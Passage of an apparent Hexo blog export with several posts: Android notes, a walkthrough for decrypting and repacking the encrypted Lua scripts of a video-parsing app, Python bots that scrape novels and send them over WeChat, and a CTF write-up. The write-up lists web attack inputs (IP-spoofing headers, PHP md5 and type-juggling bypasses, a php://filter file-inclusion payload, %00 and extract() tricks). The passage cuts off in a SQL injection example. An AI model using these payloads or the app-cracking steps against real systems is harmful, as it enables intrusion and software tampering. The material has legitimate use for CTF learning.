answerIsTrue); return intent;&#125; 要传递多个参数可以需要在newIntent方法里添加多个参数 从extra获取数据 public boolean getBooleanExtra(String name, boolean defaultValue) 1getIntent().getBooleanExtra(EXTRA_ANSWER_IS_TRUE, false) 从子 activity 获取返回结果 public void startActivityForResult(Intent intent, int requestCode) 设置返回结果 public final void setResult(int resultCode)public final void setResult(int resultCode, Intent data) 父activity依据子activity的完成结果采取不同操作 默认的结果代码 -Activity.RESULT_CANCELED 返还intent 创建一个Intent 附加上extra信息 调用Activity.setResult(int, Intent)方法 添加一个方法协助解析出父activity能用的信息 处理返回结果 父类覆盖onActivityResult(...)方法获取子activity回传的值 检查请求代码和返回代码是否符合预期 第六章 Android SDK版本与兼容Android SDK版本所有的设置都保存在应用模块的build.gradle文件中。编译版本独占该文件，最低版本和目标版本在该文件中的作用是覆盖和设置配置文件AndroidManifest.xml 最低版本（minSdkVersion）以最低版本设置值为标准，操作系统会拒绝将应用安装在系统版本低于标准的设备上。 目标版本（targetSdkVersion）目标版本的设定值告知Android：应用是为哪个API级别设计的。大多数情况下，目标版本即最新发布的Android版本。 编译版本（compileSdkVersion）SDK最低版本和目标版本会通知给操作系统，而SDK编译版本只是你和编译器之间的私有信息。 编译目标的最佳选择为最新的API级别 兼容性问题将高API级别代码置于检查Android设备版本的条件语句中 1if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.LOLLIPOP) Build.VERSION.SDK_INT常量代表了Android设备的版本号 第七章 UI fragment与fragment管理器引入Fragment采用fragment而不是activity来管理应用UI，可绕开Android系统activity使用规则的限制 fragment是一种控制器对象， activity可委派它执行任务。这些任务通常就是管理用户界面。受管的用户界面可以是一整屏或是整屏的一部分 创建 UI Fragment Fragment.onCreate(Bundle)是公共方法，而Activity.onCreate(Bundle)是受保护方法。Fragment.onCreate(Bundle)方法及其他Fragment生命周期方法必须是公共方法，因为托管fragment的activity要调用它们 类似于activity， fragment同样具有保存及获取状态的bundle。如同使用Activity. onSaveInstanceState(Bundle)方法那样，你也可以根据需要覆盖Fragment.onSaveInstanceState(Bundle)方法 fragment的视图是在onCreateView(LayoutInflater inflater, ViewGroup container方法里生成的。该 方 法 实 例 化 fragment 视 图 的 布 局 ， 然 后 将 实 例 化 的View返 回 给 托 管activity 。LayoutInflater及ViewGroup是实例化布局的必要参数。 Bundle用来存储恢复数据，可供该方法从保存状态下重建视图 向 FragmentManager添加 UI fragment 在Activity中的onCreate(...)里获取FragmentManager： 1FragmentManager fm = getSupportFragmentManager(); 获取FragmentManager之后，再获取一个fragment交给它管理 1234567Fragment fragment = fm.findFragmentById(R.id.fragment_container);if (fragment == null) &#123; fragment = new CrimeFragment(); fm.beginTransaction() .add(R.id.fragment_container, fragment) .commit();&#125; (创建一个新的fragment事务，执行一个fragment添加操作，然后提交该事务) fragment事务被用来添加、移除、附加、分离或替换fragment队列中的fragment。 FragmentManager.beginTransaction()方法创建并返回FragmentTransaction实例。FragmentTransaction类支持流接口（fluent interface）的链式方法调用，以此配置FragmentTransaction再返回它。 其中add(...)方法是整个事务的核心，它有两个参数：容器视图资源ID和新创建的CrimeFragment。容器视图资源ID有两个作用： ①. 告诉FragmentManager，fragment视图应该出现在activity视图的什么位置； ②. 唯一标识FragmentManager队列中的fragment。 采用fragment的应用架构设计应用时，正确使用fragment非常重要。fragment是用来封装关键组件以方便复用。实践证明，应用单屏最多使用2~3个fragment 拓展：极限编程方法论中有个YAGNI原则。 YAGNI（ You Aren’t Gonna Need It）的意思是“你不会需要它”，该原则鼓励大家不要去实现那些有可能需要的东西。为什么呢？因为你不会需要它。 对于fragment，我们坚持AUF（ Always Use Fragments）原则，即“总是使用fragment”。不值得为使用fragment还是activity伤脑筋。]]></content>
      <categories>
        <category>Android开发</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[对某视频解析软件的逆向分析]]></title>
    <url>%2F2020%2F03%2F07%2F%E5%AF%B9%E6%9F%90%E8%A7%86%E9%A2%91%E8%A7%A3%E6%9E%90%E8%BD%AF%E4%BB%B6%E7%9A%84%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[该app使用了Lua脚本并进行了加密，借此机会实践一下Lua脚本解密 前言最近偶然发现一款全网视频解析的软件，安装后发现首页有影响使用体验的广告存在（现在作者已取消广告），同时其附加功能需要加群获取密码才能使用。借这个机会尝试通过逆向工程分析其逻辑，同时这个App使用了Lua脚本并进行了加密，也借此机会实践一下Lua脚本的解密 软件的原始版本下载：原始版本 软件截图 首页 VIP功能 VIP功能 工具 apktool—可以将apk资源解码，并在修改后可以重新构建它们，它还可以执行一些自动化任务，例如构建apk unluac.jar—是一个lua脚本反编译工具，适用于反编译lua开发的程序源码 分析过程 使用Apktool对其进行解包，解包到App目录下1apktool.bat d VIP终结者_5.2.2.apk -o App 执行完毕后进入App目录下 其中： assets：存放资源文件，包含Lua脚本 lib：本地库(Native Library)文件夹，包含编译后的本地代码(Native Code)的so文件 smail：存放smail文件，包含Dalvik字节码，是对App的Java代码反编译成字节码的结果 AndroidManifest.xml：包含App的信息 分析smail进入smail文件夹可以看到Java代码的结构： 发现存在com.androlua、com.luajava等包名，经搜索相关项目，判断App的大部分代码均来自AndroLua_pro。而AndroLua_pro是一个使用Lua语言编写的Android应用的项目，所以，Java代码极有可能并不是应用的主体部分，重要操作很有可能会写在Lua中，所以下面重点分析Lua脚本部分。 初步分析Lua进入assets可以看到里面存放了所有的Lua脚本及App的图片资源： 用winhex打开lua脚本: 发现并不是Lua明文代码，也不是编译后的luac文件。由此得知Lua脚本被加密了，需要对其进行解密 解密LuaAndroLua_Pro所使用的Lua工具LuaJava会加载依赖库libluajava.so，LuaJava会使用luaL_loadbuffer或者luaL_loadbufferx函数对Lua脚本进行加载，这个函数也是加入Lua脚本解密代码的常见位置，所以找到lib/armeabi/libluajava.so，用IDA打开并找到这个函数，按F5进行进一步分析： （上图为方便阅读，已反混淆变量名） 与AndroLua_Pro的原始代码比较，可以发现加入了Lua脚本解密的代码，分析该代码发现有一个IDA无法识别的函数sub_265E0(t, 255)，由于对IDA工具还有很多不懂的地方，故没有深入研究，初步猜测是t对255的取余运算（后面验证确实如此）。我们可以参考这一代码，使用C语言编写一个简单的解密工具： 1234567891011121314151617181920212223242526272829303132333435#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;unsigned char *decrypt(const unsigned char *buff, size_t size) &#123; unsigned char *buff1 = (unsigned char *) malloc(size); buff1[0] = 27; int t = 0; for (int i = 1; i &lt; size; i++) &#123; t += size; buff1[i] = buff[i] ^ (t % 255); &#125; return buff1;&#125;unsigned char buff[204800];int main(int argc, char *argv[]) &#123; char filename[20] = "main.lua"; if (argc == 2) strcpy(filename,argv[1]); printf("File name: %s \n", filename); FILE *fp = fopen(filename, "rb"); size_t size = 0; size = fread(buff, sizeof(unsigned char), 204800, fp); printf("File size: %ld \n", size); unsigned char *res = decrypt(buff, size); strcat(filename, "c"); FILE *fp1 = fopen(filename, "wb"); fwrite(res, sizeof(unsigned char), size, fp1); printf("Output: %s", filename); return 0;&#125; 编译这一代码为decrypt.exe，并拷贝到assets文件夹下，执行以下命令来解密config.lua脚本： 1decrypt.exe config.lua 解密后的文件为config.luac，使用文本编辑器观察可以发现其仍然不是Lua代码，而是编译后的luac文件，我们还需要使用unluac.jar对其进行反编译。 1java -jar unluac.jar --rawstring config.luac &gt; config_new.lua (如果原始的源码中含有中文，需使用--rawstring参数进行解码) 反编译后的config.lua脚本内容如下： 对Lua脚本的修改不是本文探讨的重点，故不做分析。 使用如下命令进行打包： 1apktool b App –o out/newApp.apk 打包后的apk文件没有签名是不能安装到手机上的，需要使用其他的签名工具来对apk签名如signapk.jar、auto-sign等 结语本文分析了在Android中Lua脚本的解密过程，可以看到，软件的开发和逆向分析虽然看似处于对立的层面，但是双方的博弈过程却又促进着各自的发展，这使得开发人员更加重视软件的安全性，逆向工程师们也与时俱进的学习新的知识来面对越来越复杂的安全工作。随着国家现在越来越重视互联网安全问题，很多法律法规的出台来约束互联网规范，我们更应该重视安全对于各行各业的影响和机遇。]]></content>
      <categories>
        <category>逆向分析</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[爬取某书网指定小说-微信版]]></title>
    <url>%2F2018%2F12%2F15%2F%E7%88%AC%E5%8F%96%E6%9F%90%E4%B9%A6%E7%BD%91%E6%8C%87%E5%AE%9A%E5%B0%8F%E8%AF%B4-%E5%BE%AE%E4%BF%A1%E7%89%88%2F</url>
    <content type="text"><![CDATA[服务器版的小说爬虫，并借助python的itchat库实现微信对话式小说下载服务 实现功能微信端发送小说名到指定微信号（格式：小说名suqir作者），服务器开始在全书网(http://www.quanshuwang.com)爬取该小说，爬取完成后将询问是否下载，确认后将通过微信以文件的形式发送 源代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134#!/usr/bin/python#coding:utf-8import urllib.requestimport requests,reimport itchatfrom itchat.content import *class BookSpyder(object): """爬取指定小说-server版""" def __init__(self, book_name,book_author): super(BookSpyder, self).__init__() self.book_author = book_author self.headers = &#123;'User-Agent': 'User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36'&#125; self.url = 'http://www.quanshuwang.com/modules/article/search.php?searchkey='+urllib.request.quote(book_name.encode('gb2312'))+'&amp;searchtype=articlename&amp;searchbuttom.x=88&amp;searchbuttom.y=22' search_data = requests.get(self.url,headers=self.headers,allow_redirects=False) try: # 搜索结果唯一时 self.location = search_data.headers['location'].split() self.location2res(self.location[0]) except KeyError: self.location = re.findall(r'&lt;li&gt;&lt;a target="_blank" href="(.*?)".*?title="(.*?)".*&gt;(.*?)&lt;/a&gt;&lt;em class=.*?&gt;(.*?)&lt;a href=',search_data.content.decode('gbk')) for http in self.location: flag = self.location2res(http[0]) if flag == 1: break #link self.booklink = re.findall(r'class="leftso png_bg"&gt;&lt;a href="(.*?)"',self.res)[0] #正则匹配书名 self.book_name = re.findall(r'&lt;meta property="og:title" content="(.*?)"/&gt;',self.res)[0] response = requests.get(self.booklink,headers=self.headers).content.decode('gbk') #正则匹配所有章节及其链接 self.contents = re.findall(r'&lt;li&gt;&lt;a href="(.*?)" title="(.*?)"&gt;.*?&lt;/a&gt;&lt;/li&gt;',response) #总章数 self.len = len(self.contents) def location2res(self,location): flag = -1 self.res = requests.get(location,headers=self.headers).content.decode('gbk') author = re.findall(r'&lt;meta property="og:novel:author" content="(.*?)"',self.res)[0] if self.book_author == author: flag = 1 try: self.description = re.findall(r'介绍:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;(.*?)&lt;/div&gt;',self.res,re.S)[0].replace('&amp;nbsp;','').replace('&lt;br /&gt;','') except IndexError: pass return flag def save(self): i = 0 #开始写入文件 with open('./book/suqir.txt','w',encoding='utf-8',errors='ignore') as text_save: text_save.write(self.book_name+'\n作者：'+self.book_author) if 'self.description' in dir(): text_save.write('\n简介：'+self.description) text_save.write('\n') for num in self.contents: #获取单章文本 text_r = requests.get(num[0],headers=self.headers) text_c = text_r.content text = text_c.decode('gb18030') #获取章节名 title = num[1].replace(re.findall(r'，共\d*字',num[1])[0],'') try: #正则匹配内容 text = re.findall(r'&lt;/script&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;(.*?)&lt;script type="text/javascript"&gt;',text,re.S)[0] #数据清洗 text = text.replace('&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;','') text = text.replace('&lt;br /&gt;','') text = text.replace('\r\n\r\n','\r\n') text_save.write('\n') text_save.write(title) text_save.write('\n\n') text_save.write(text) text_save.write('\n') print('[*]%-30s\t完成度%.3f%%'%(title,(i+1) * 100 / self.len)) i += 1 except IndexError as e: print('【*】%s下载失败'%title) text_save.write('\n===全书完===\n==by苏乞儿==\n') def get_bookname(self): return self.book_name def get_bookauthor(self): return self.book_author def get_des(self): try: return self.description except AttributeError: return '无简介' def get_centents(self): return self.len def get_booklink(self): return self.booklinkdef getUserName(): itchat.auto_login(hotReload=True,enableCmdQR=2) onlyUser = itchat.search_friends(name='杰帅') return onlyUser[0]['UserName']@itchat.msg_register([TEXT],isFriendChat=True)def text_reply(msg): global userName if msg['FromUserName'] == userName: try: bookName,bookAuthor = msg['Text'].split('suqir') book = BookSpyder(bookName,bookAuthor) itchat.send('书名：%s\n作者：%s\n简介：%s' % (bookName,bookAuthor,book.get_des()),toUserName=userName) itchat.send('正在爬取《%s》...' % bookName,toUserName=userName) print('[*]正在爬取《%s》...' % bookName) book.save() itchat.send('爬取完毕！是否下载？(是/否)',toUserName=userName) except ValueError: if msg['Text'] == '是': print('[*]正在发送文件...') itchat.send('正在上传...',toUserName=userName) itchat.send_file('./book/suqir.txt',toUserName=userName) print('[*]已发送文件！\n等待下次请求...') itchat.send('感谢使用！',toUserName=userName) elif msg['Text'] == '否': itchat.send('已取消，感谢使用！',toUserName=userName)if __name__ == '__main__': print('[*]Starting...') userName = getUserName() itchat.run() 运行部分截图服务器端 客户端]]></content>
      <categories>
        <category>Python</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[利用微信实现小说更新提醒]]></title>
    <url>%2F2018%2F11%2F26%2F%E5%88%A9%E7%94%A8%E5%BE%AE%E4%BF%A1%E5%AE%9E%E7%8E%B0%E5%B0%8F%E8%AF%B4%E6%9B%B4%E6%96%B0%E6%8F%90%E9%86%92%2F</url>
    <content type="text"><![CDATA[人生最痛苦的事莫过于小说断更！这篇文章将对这一问题给出一种Python+阿里云+微信的解决方法不过世界总是需要懒人的，因为有了懒人创造世界。这话不是我说的，是马爸爸说的： 懒不是傻懒，如果你想少干，就要想出懒的方法。要懒出风格，懒出境界。——马云 为此我专门买了一台服务器（9.9还包邮哦），反正以后还有很多地方用到服务器。 扯远了。。。利用服务器可以干很多事，比如接下来的利用微信第三方python库实现小说更新时通过微信将更新内容发给指定朋友。 代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#!/usr/bin/python#coding:utf-8import time,itchat # 微信登录def vxLogin(rename): # enableCmdQR：在命令行中显示登录二维码，参数2是Linux系统下的字符宽度 itchat.auto_login(hotReload=True,enableCmdQR=2) friends = itchat.get_friends(update=True) for friend in reversed(friends): if friend['RemarkName'] == rename: toName = friend['UserName'] return toName# 检查更新def update(url,start,toName): import requests,re res = requests.get(url).content.decode('gb18030') lis = re.findall(r'&lt;li&gt;&lt;a href="(.*?)" title="(.*?)，.*?"&gt;',res) toName = vxLogin(rename=toName) for li in lis[start:]: end_str = li[1] try: end = int(re.findall(r'第[ ]?(.*?)[ ]?章',end_str)[0]) except ValueError: print('[*]小说更新了，但是章节序号为中文，我暂时不想处理。。。') #碰到这种情况再更新，懒 exit() if end &gt;= start+1: text = requests.get(li[0]).content.decode('gbk') re_text = re.findall(r'&lt;/script&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;(.*?)&lt;script',text,re.S)[0] re_text = re_text.replace('&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;','') re_text = re_text.replace('&lt;br /&gt;','') re_text = re_text.replace('\r\n\r\n','\r\n') re_text = '%s\n%s\n\n' %(li[1],re_text) print('更新：%s' % li[1]) text = '最近更新了第%s章\n%s' % (end,re_text) length = len(text)//3 # 分3段发送 itchat.send(msg=text[:length], toUserName=toName) itchat.send(msg=text[length:(length*2)], toUserName=toName) itchat.send(msg=text[(length*2):], toUserName=toName) time.sleep(5) print('[*]更新完成！暂无最新章节') # 声明startNum为全局变量，这样就不会在这个函数内部新建变量 global startNum startNum = end time.sleep(3600)# 1小时更新检查一次if __name__ == '__main__': print('[*]Starting...') # 当前最新章节 startNum = 410 while True: update(url='http://www.quanshuwang.cn/book/137/137120',start=startNum,toName='杰帅')# toName为None时发给自己 # 持续运行 itchat.run() 这里的urlhttp://www.quanshuwang.cn/book/137/137120是我看的《一步偷天》在全书网的网址 运行结果服务器端： 微信端： 小说也看完了，终于又可以开始写bug了！！ 另外，这个博客只作分享交流技术用，大爷们不用打赏，真的不用，真的不用，（疯狂暗示中…）]]></content>
      <categories>
        <category>Python</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[爬取某书网指定小说]]></title>
    <url>%2F2018%2F11%2F07%2F%E7%88%AC%E5%8F%96%E6%9F%90%E4%B9%A6%E7%BD%91%E6%8C%87%E5%AE%9A%E5%B0%8F%E8%AF%B4%2F</url>
    <content type="text"><![CDATA[初探Python - 用Python实现对小说的爬取并下载 起因最近看了一部基于小说改编的电视剧，闲的无聊就去看了看小说。但是大多数看书网站都有或多或少的广告，强迫症表示很难受，加之近来正在学习Python，便想着利用Python爬取小说的内容，远离广告的‘宠信’。 实现原理程序实现原理很简单，将用户输入的书名提交到全书网进行搜索，将返回的结果存在list中并展示给用户，对用户选择的书籍进行书籍内容的爬取，并写入文件。 存在的问题初次学习写这种爬虫，代码难免冗余难读，但关键部分均写有注释，在此分享出来以作交流。在实际操作过程中也遇到不少问题，比如：如果所查询的书籍在全书网中只有唯一的一本，全书网将直接通过location进行重定向到书籍详情页，与多本书的处理方式不一致，所以为了完美的获取书记简介必须写个if判断；再如：用户提交的书名必须经过gb2312编码并转urlencoding后才能查询到，否则服务器返回错误。。。不过，也可能是我第一次写，有更好的处理方法，希望自己继续努力吧！ 源代码：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151# -*- coding: utf-8 -*-import requests,sys,reimport urllib.requestclass Bookspider(object): """爬取全书网指定书籍并下载到本地""" def __init__(self): super(Bookspider, self).__init__() self.request = requests.session() self.headers = &#123; #随机指定user-agent 'User-Agent': 'User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36' &#125; def book_search(self,name): print('[*]搜索中...') #全书网的搜索url #对name进行url编码：urllib.request.quote self.url = 'http://www.quanshuwang.com/modules/article/search.php?searchkey='+urllib.request.quote(name.encode('gb2312'))+'&amp;searchtype=articlename&amp;searchbuttom.x=88&amp;searchbuttom.y=22' #禁止重定向：allow_redirects=False search_data = self.request.get(self.url,headers=self.headers,allow_redirects=False) try: #所爬书籍唯一时被重定向到location self.location = search_data.headers['location'] #将str的location转换成list，方便计算length self.location = self.location.split() except KeyError as e: response = search_data.content.decode('gbk') #所爬书籍有多种结果时，返回所有书籍信息 self.location = re.findall(r'&lt;li&gt;&lt;a target="_blank" href="(.*?)".*?title="(.*?)".*&gt;(.*?)&lt;/a&gt;&lt;em class=.*?&gt;(.*?)&lt;a href=',response) return self.location def book_info(self): res = requests.get(self.location,headers=self.headers).content.decode('gbk') #正则匹配书名 self.bookname = re.findall(r'&lt;meta property="og:title" content="(.*?)"/&gt;',res)[0] #正则匹配书籍作者 self.author = re.findall(r'&lt;meta property="og:novel:author" content="(.*?)"/&gt;',res)[0] #正则匹配书记简介 re.S指定多行匹配 self.description = re.findall(r'&lt;meta property="og:description" content="(.*?)"/&gt;',res,re.S)[0].replace('&amp;nbsp;','').replace('&lt;br /&gt;','').replace(' ','') #正则匹配书籍目录 self.booklink = re.findall(r'class="leftso png_bg"&gt;&lt;a href="(.*?)"',res)[0] response = requests.get(self.booklink,headers=self.headers).content.decode('gbk') #正则匹配所有章节及其链接 self.contents = re.findall(r'&lt;li&gt;&lt;a href="(.*?)" title="(.*?)"&gt;.*?&lt;/a&gt;&lt;/li&gt;',response) #总章数 self.len = len(self.contents) def save(self): i = 0 #开始写入文件 with open('%s.txt'%self.bookname,'w',encoding='utf-8',errors='ignore') as text_save: text_save.write(self.bookname+'\n作者：'+self.author) text_save.write('\n简介：'+self.description) text_save.write('\n') for num in self.contents: #获取单章文本 text_r = requests.get(num[0],headers=self.headers) text_c = text_r.content text = text_c.decode('gbk') #获取章节名 title = num[1].replace(re.findall(r'，共\d*字',num[1])[0],'') try: #正则匹配内容 text = re.findall(r'&lt;/script&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;(.*?)&lt;script type="text/javascript"&gt;',text,re.S)[0] except IndexError as e: print('【**】%s下载失败'%title) #数据清洗 text = text.replace('&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;','') text = text.replace('&lt;br /&gt;','') text = text.replace('\r\n\r\n','\r\n') text_save.write('\n') text_save.write(title) text_save.write('\n\n') text_save.write(text) text_save.write('\n') print('[*]%-30s\t完成度%.3f%%'%(title,(i+1) * 100 / self.len)) i += 1 text_save.write('\n===全书完===\n==by苏乞儿==\n') def get_item(self): item = len(self.location) return item def set_location(self,location): self.location = location def get_bookname(self): return self.bookname def get_author(self): return self.author #获取总章数 def get_chapter(self): return self.len def get_description(self): return self.descriptionif __name__ == '__main__': book = Bookspider() name = input('[*]请输入书名：') #查书 locations = book.book_search(name) item_sum = book.get_item() #以下为两种搜索结果的处理，1.所爬的书籍在全书网是唯一的，2.所爬的书籍在全书网有多本 if item_sum == 1: book.set_location(locations[0]) book.book_info() print('[*]%s共%d条搜索结果：\n'%(name,item_sum)) print('#'*150) print('[*]书名：%s'%book.get_bookname()) print('[*]作者：%s'%book.get_author()) print('[*]简介：%s'%book.get_description()) print('#'*150) choose1 = input('[*]是否继续下载？(y/n)') if choose1 == 'y' or choose1 == 'Y': print('\n[*]正在下载《%s》'%book.get_bookname()) #保存文本 book.save() else: print('\n[*]感谢使用！') sys.exit(1) else: j = 0 print('[*]%s共%d条搜索结果：\n'%(name,item_sum)) for item in locations: print('#'*150) print('[*]序号：%d'%(j+1)) print('[*]书名：%s'%item[1]) print('[*]作者：%s'%item[2]) print('[*]简介：%s'%item[3]) print('#'*150) j +=1 choose2 = int(input('\n\n请选择序号：')) if choose2 &gt;= 1 and choose2 &lt;= item_sum: print('\n[*]正在下载《%s》'%locations[choose2-1][1]) #设置书籍链接地址 book.set_location(locations[choose2-1][0]) book.book_info() #保存文本 book.save() else: print('\n[*]感谢使用！') sys.exit(1) print('\n[*]下载成功！') 部分运行截图： 下载的文本文件： 更新（2018年11月26日）后期使用过程发现还有不少bug，不过毕竟算第一篇爬虫，这边就不删除了，留个纪念吧！较完善的服务器版本在这里：爬取某书网指定小说-微信版]]></content>
      <categories>
        <category>Python</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[记一次CTF大赛的感受]]></title>
    <url>%2F2018%2F10%2F29%2F%E8%AE%B0%E4%B8%80%E6%AC%A1CTF%E5%A4%A7%E8%B5%9B%E7%9A%84%E6%84%9F%E5%8F%97%2F</url>
    <content type="text"><![CDATA[对山东省网络技术大赛的参赛体会和总结 前言10月27号的山东省网络技术大赛是我大学参加过的第一个比赛，在这个比赛中我和各大高校的大佬们共同在网络攻防CTF夺旗赛这一命题中进行角逐。其实在去之前我的心里是没有多少信心的（事实证明我的担心是有必要的），同时寄希望于其他选手水平也差不多，我也只看过一些基础的web方向的解题方法，只看过几篇关于隐写的题，因为在我看来这种比赛应该不会涉及到密码，逆向，溢出和隐写等等这几类题，然而。。。 先分享一下我比赛最后的排名情况： 我的成绩在里面不是特别理想，在39名选手中排在第11位，得分仅331，与前三名一千多的得分更是有着不小的差距（小声哔哔：前三是来自警察学院的未来的网警），但究其根本还是自己在网络安全这一领域还有很长的路要走。 下面是在这次比赛中我得到的一些经验和教训，特地分享出来，一来警示自己，二来以作交流。另外，我会在后面把所有题做一遍并写一篇write up(如果官方还没有关闭训练场) 不足 过分自信，轻视对手 解题时心静不下来，导致做题时没有深入，往往错过很多会做的题 没有设立明确的目标，导致会的题因为较其他选手稍晚得到flag，得分较低；不会的题又没有尝试去解 在网络安全领域坐井观天，没有保持一颗学习的心态 受益 心中始终坚信：学无止境 积累了大赛经验，后续参加此类比赛不至于手忙脚乱 坚守自己的底线 展望在经历了此次比赛后，虽然没有取得满意的成绩，但也更加坚定了对未来继续扩展学习方向的信心。接下来的近一年时间，我将根据时间安排准备下一届的网络安全大赛，同时进行PHP、Python等语言的学习，争取将各个CTF大赛的题看一遍write up或自己试解，希望能在下一届的比赛中获得一个令自己比较满意的成绩。 人生没有退路，只有不停地选择！]]></content>
      <categories>
        <category>渗透</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[CTF]]></title>
    <url>%2F2018%2F10%2F12%2FCTF%2F</url>
    <content type="text"><![CDATA[本文总结了CTF中我所遇到的题型及其write up，本文长期更新 希望各位多多评论指正，也算作对我第一次写技术文章的鼓励！ 训练场：南京邮电大学CTF题库 直接查看源码出现场景：一般出现在第一题 write up： 直接Ctrl+u查看网页源码寻找flag 修改maxlength出现场景：输入框输入内容有位数限制 write up：F12进入开发者模式修改maxlength后提交 IP伪造各种伪造IP的HTTP头： 序号 伪造方式 1 X-Forwarded-For 2 Client-IP 3 x-remote-IP 4 x-originating-IP 5 x-remote-addr 进制转换源码： 123456789101112131415161718192021&lt;?phpfunction noother_says_correct($number)&#123; $one = ord('1'); $nine = ord('9'); for ($i = 0; $i &lt; strlen($number); $i++) &#123; $digit = ord($number&#123;$i&#125;); if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) &#123; return false; &#125; &#125; return $number == '54975581388';&#125;$flag='*******';if(noother_says_correct($_GET['key'])) echo $flag;else echo 'access denied';?&gt; 分析：要求传入key不包含数字[1-9]，但又等于54975581388，考虑转十六进制，发现54975581388=0xccccccccc,因此get方法传值key=0xccccccccc PHP弱类型类型一介绍：PHP在处理哈希字符串时，会利用“!=”或“==”来对哈希值进行比较，它把每一个以”0e”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以“0e”开头的，那么PHP将会认为他们相同，都是0 出现场景：PHP代码审计、含md5的题 write up： 修复方法：“===”和“!==”strict比较符，只有在类型相同时才相等。“==”和“!=”即non-strict比较符，会在类型转换后进行比较 扩展：0e开头MD5值小结 string md5() s878926199a 0e545993274517709034328855841020 s155964671a 0e342768416822451524974117254469 s214587387a 0e848240448830537924465865611904 类型二源码： 1234567if (isset($_GET['a']) and isset($_GET['b'])) &#123;if ($_GET['a'] != $_GET['b'])if (md5($_GET['a']) == md5($_GET['b']))die('Flag: '.$flag);elseprint 'Wrong.';&#125; 分析：$_GET可以接受数组但MD5()函数若传递进去一个数组，则会返回null.因此向$_GET数组传入两个名为a、b的不相等的数组从而导致md5()均返回空:index.php?a[]=1&amp;b[]=2（即null=null） 脑洞题 源码找url 源码看flag jjencode/aaencode（颜文字）介绍： 什么是jjencode? 将js代码转换成只有符号的字符串 什么是aaencode？ 将js代码转换成常用的网络表情 aaencode加密：http://utf-8.jp/public/aaencode.html 解法：可以直接利用浏览器的控制台输入密文，执行后即可解密。 文件包含漏洞典型的文件包含漏洞的格式网址：php?file=xxx.php 原因：网页后端php（或其他）代码中使用了include等文件包含语句，而且所包含的文件由变量控制，恰恰此变量又能通过GET或POST等方式进行修改所造成的 利用方法：构建file=php://filter/read=convert.base64-encode/resource=index.php 注：其中index.php可以为任意已包含文件返回base64加密过的index.php文件源码。 注意：python3中base64的解密为base64.b64decode() mysql 精度问题 intval()这个函数的作用是把参数自动转换成整数（int） $id = intval(1024.5)//结果为$id==1024 robots.txt介绍：robots.txt是搜索引擎中访问网站的时候要查看的第一个文件，robots.txt文件告诉了蜘蛛程序在服务器上什么文件是可以被查的。 %00源码： 12345678if (isset ($_GET['nctf'])) &#123; if (@ereg ("^[1-9]+$", $_GET['nctf']) === FALSE) echo '必须输入数字才行'; else if (strpos ($_GET['nctf'], '#biubiubiu') !== FALSE) die('Flag: '.$flag); else echo '骚年，继续努力吧啊~';&#125; 涉及漏洞：查到资料 1.ereg会把null视为字符串的结束，从而被%00截断，而strpos则可以越过%00 2.当ntf为数组时它的返回值不是FALSE 利用方法： 1.?nctf=1%00%23biubiubiu 2.?nctf[]=1 变量覆盖源码： 123456789&lt;?php if ($_SERVER["REQUEST_METHOD"] == "POST") &#123; ?&gt; &lt;?php extract($_POST); if ($pass == $thepassword_123) &#123; ?&gt; &lt;div class="alert alert-success"&gt; &lt;code&gt;&lt;?php echo $theflag; ?&gt;&lt;/code&gt; &lt;/div&gt; &lt;?php &#125; ?&gt;&lt;?php &#125; ?&gt; 分析：extract()函数的作用：从数组中将变量导入到当前的符号表 可以看到这里的代码为：extract($_POST)，即将POST的参数导入当前的符号表 由于extract()函数存在变量覆盖漏洞，所以提交post参数： pass=123&amp;thepassword_123=123//或者pass[]=&amp;thepassword_123 即:将两个变量的值修改成相同的，即可得到flag！ 上传绕过源码： 123456789文件上传&lt;br&gt;&lt;br&gt;&lt;form action="upload.php" method="post"enctype="multipart/form-data"&gt;&lt;label for="file"&gt;Filename:&lt;/label&gt;&lt;input type="hidden" name="dir" value="/uploads/" /&gt;&lt;input type="file" name="file" id="file" /&gt; &lt;br /&gt;&lt;input type="submit" name="submit" value="Submit" /&gt;&lt;/form&gt; 0x00截断绕过方法：在burpsuite—Hex中，将空格php后面一个字符的hex修改为00 SQL注入常规注入正常闭合源码： 1234567891011121314151617&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123; mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = trim($_POST[user]); $pass = md5(trim($_POST[pass])); $sql="select user from ctf where (user='".$user."') and (pw='".$pass."')"; echo '&lt;/br&gt;'.$sql; $query = mysql_fetch_array(mysql_query($sql)); 